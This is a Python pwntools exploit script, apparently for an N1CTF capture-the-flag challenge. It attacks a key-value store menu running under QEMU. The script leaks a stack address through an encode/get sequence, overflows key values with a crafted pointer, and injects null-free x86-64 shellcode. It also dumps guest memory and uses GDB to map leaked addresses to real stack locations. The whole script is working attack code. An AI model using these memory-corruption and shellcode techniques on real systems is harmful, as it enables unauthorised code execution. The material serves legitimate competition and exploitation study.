from pwn import *
import os
import time
import re
import random
from gmpy2 import mpz
context.bits = 64
context.arch = "amd64"

mapping = {
    0x1f757d3c:0x5fab24,
    0x1275213c:0x300724,
    0x1fe52860:0x700324
}

for n in range(256, 256+513, 1):
    r = process(["./start.sh", str(n)])

    for i in range(100):
        r.send("\x1b") # ESC

    def rec():
        return r.recvuntil("> \n")

    r.recvuntil("> \n", timeout=20)
    if not os.path.exists("./mem{}.dump".format(n)):
        r2 = process("telnet localhost 4321".split())
        r2.recvuntil("(qemu) ")
        r2.sendline("dump-guest-memory mem{}.dump".format(n))

    def set_var(key, value):
        r.sendline("1")
        r.recvuntil("Key name:")
        if len(key) == 0x10:
            r.send(key)
        else:
            r.sendline(key)

        r.recvuntil("Key value:")
        if len(value) == 0x100:
            r.send(value)
        else:
            r.sendline(value)
        rec()

    def del_var(key):
        r.sendline("2")
        r.recvuntil("Key name:")
        if len(key) == 0x10:
            r.send(key)
        else:
            r.sendline(key)
        rec()

    def get_var(key):
        r.sendline("3")
        r.recvuntil("Key name:")
        if len(key) == 0x10:
            r.send(key)
        else:
            r.sendline(key)
        r.recvuntil("Value: \n")
        return rec()

    def encode(key):
        r.sendline("4")
        r.recvuntil("Key name:")
        if len(key) == 0x10:
            r.send(key)
        else:
            r.sendline(key)

    shellcode = """
    mov rax, [rsp + 0x48]
    xor edx, edx
    mov dx, 0x19f6
    sub rax, rdx
    xor rcx, rcx
    mov [rcx], rax
    mov cl, 0x8
    mov dx, 0x0000000000001AAF
    add rax, rdx
    mov [rcx], rax
    mov rdi, rcx
    mov esp, {stack_minus_320}
    mov ebp, {stack_minus_310}
    call rax

    xor rcx, rcx
    mov rax, [rcx]
    mov dx, 0x19fc
    add rax, rdx
    mov edi, {stack}
    xor esi, esi
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    push rdi
    jmp rax
    """

    set_var("A", "D"*0x10)
    del_var("N1CTF_KEY1")

    encode("A")
    leak = get_var("A")

    print(leak.encode("hex"))
    leak = u32(leak.split("DDDD")[0][-4:]) ^ 0x44444444
    print("LEAK", hex(leak))
    # stack = leak + (random.randint(0, 8) << 20) + 0x724
    stack = leak
    print(hex(stack))

    shellcode = shellcode.format(stack=hex(stack), stack_minus_320=hex(stack - 0x320), stack_minus_310=hex(stack - 0x310))
    shellcode = asm(shellcode)
    assert "\x00" not in shellcode
    assert "\n" not in shellcode
    assert chr(13) not in shellcode

    set_var("N1CTF_KEY2", "B"*0x18 + p64(stack))
    set_var("N1CTF_KEY3", "C"*0xff)
    set_var("A", "D"*0x10 + shellcode)
    set_var("N1CTF_KEY1", "A"*0xff)

    map_key = leak

    if not os.path.exists("./mem{}.dump".format(n)):
        r2.recvuntil("(qemu) ")
        r2.close()
    r.close()

    f = open("mem{}.dump".format(n), "rb").read()
    offs = []
    for m in re.finditer("1.Add", f):
        offs.append(m.start())

    base = offs[1] - 0x00000000000f0530 + 0x0000000000100000 - 0x0000000000028E7C

    gdbinit = """source /home/alex/.gdbinit-gef.py
target remote :1234
b *{} + 0x0000000000002043

define hook-stop
x/5i $rip
end

continue""".format(hex(base))

    with open("/home/alex/.gdbinit", "w") as gg:
        gg.write(gdbinit)

    r = process(["./start.sh", str(n)])

    for i in range(100):
        r.send("\x1b") # ESC

    r.recvuntil("> \n", timeout=20)

    shellcode = """
    mov rax, [rsp + 0x48]
    xor edx, edx
    mov dx, 0x19f6
    sub rax, rdx
    xor rcx, rcx
    mov [rcx], rax
    mov cl, 0x8
    mov dx, 0x0000000000001AAF
    add rax, rdx
    mov [rcx], rax
    mov rdi, rcx
    mov esp, {stack_minus_320}
    mov ebp, {stack_minus_310}
    call rax

    xor rcx, rcx
    mov rax, [rcx]
    mov dx, 0x19fc
    add rax, rdx
    mov edi, {stack}
    xor esi, esi
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    add esi, 0x50
    push rdi
    jmp rax
    """

    set_var("A", "D"*0x10)
    del_var("N1CTF_KEY1")

    encode("A")
    leak = get_var("A")

    print(leak.encode("hex"))
    leak = u32(leak.split("DDDD")[0][-4:]) ^ 0x44444444
    print("LEAK", hex(leak))
    # stack = leak + (random.randint(0, 8) << 20) + 0x724
    stack = leak
    print(hex(stack))

    shellcode = shellcode.format(stack=hex(stack), stack_minus_320=hex(stack - 0x320), stack_minus_310=hex(stack - 0x310))
    shellcode = asm(shellcode)
    assert "\x00" not in shellcode
    assert "\n" not in shellcode
    assert chr(13) not in shellcode

    set_var("N1CTF_KEY2", "B"*0x18 + p64(stack))
    set_var("N1CTF_KEY3", "C"*0xff)
    set_var("A", "D"*0x10 + shellcode)
    set_var("N1CTF_KEY1", "A"*0xff)

    print("Starting GDB")

    r2 = process("gdb")
    time.sleep(3)

    print("ENCODE")
    encode("A")

    print(r2.recvuntil("gef"))
    print(r2.recvuntil("gef"))
    print(r2.recvuntil("gef"))
    print(r2.recvuntil("gef"))
    r2.sendline("p $rsp-0x108")
    sice = r2.recvline()
    print("SICE1", sice)

    real_stack = int(sice.split("0x")[1].split("\x1b")[0], 16)
    map_value = real_stack - leak

    print("="*100)
    print("MAPPING", hex(map_key), hex(map_value))

    r2.close()
    r.close()
